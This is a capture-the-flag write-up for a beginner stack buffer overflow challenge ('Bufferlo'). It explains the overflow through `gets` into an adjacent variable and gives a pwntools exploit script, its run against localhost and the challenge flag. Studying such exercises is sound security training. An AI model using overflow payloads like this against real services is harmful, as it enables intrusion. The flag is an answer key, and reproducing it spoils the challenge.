# Intended Solution for Bufferlo

The presence of `gets` and the comment in line 10 should hopefully lead us to believe that this is a buffer overflow vulnerability.

The `num_buffalo` variable is stored right below the buffer on the stack, so we can overflow the buffer into `num_buffalo`
and write our new value in. Either by using gdb and checking where on the stack the variables end up, or by trial and error,
we can find that we need 41 bytes of padding in the buffer before we hit `num_buffalo`.
So we can use pwntools or something similar to send a payload with 41 of some character followed by 0x00000001 as bytes.

Here is an example of a script that does this:
```python
from pwn import *

p = remote("localhost", 1358)
#p = process("./vuln")
print(p.recv())
p.sendline(b"A"*41 + b"\x00\x00\x00\x01")
print(p.recv())
```

And here it is being executed:
```
┌──(justjayiguess㉿just-jay)-[~/…/ctfs/pecan24/pwn/buffalo-overflow]
└─$ python3 solve.py
[+] Opening connection to localhost on port 1358: Done
b'Help! The city of New York has a buffalo overflow!\nCan you convince some to leave? We need exactly one buffalo...\n'
b'"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!" you scream into the city...\nYou did it! Take this flag as a token of our appreciation...\npecan{buff4l0_boffalo_bufferlo_8uffalo}'
[*] Closed connection to localhost port 1358
```
